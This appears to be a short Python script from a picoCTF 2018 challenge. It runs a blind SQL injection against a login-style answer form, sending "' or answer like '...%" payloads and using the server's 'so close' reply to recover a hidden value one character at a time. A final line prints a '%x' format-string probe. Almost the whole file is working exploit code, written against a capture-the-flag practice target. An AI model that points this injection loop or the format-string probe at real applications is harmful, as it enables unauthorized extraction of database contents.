import requests
import string
def checkString(s):
    url = "http://2018shell2.picoctf.com:15987/answer2.php"

    # payload = "answer='%20or%20answer%20like%20'%25"
    # newS = pre + s
    payload = "answer=' or answer like '" + s + "%"
    headers = {
        'Content-Type': "application/x-www-form-urlencoded",
        'Cache-Control': "no-cache",
        'Postman-Token': "0c26f8ca-ef00-439b-8a59-6a9b9cd31312"
        }

    response = requests.request("POST", url, data=payload, headers=headers)

    if ( 'so close' in response.text):
        return True
    else:
        return False
# print(response.text)

checkList = string.printable
checkList = string.ascii_letters + string.digits
answer = ''

def findAnswer(answer):
    checkList = string.ascii_letters + string.digits
    for s in checkList:
        checkS = answer + s
        if checkString(checkS) :
            answer = answer +s
            print(answer)
            findAnswer(answer)
        else:
            pass

# findAnswer('')
print('%x'*128)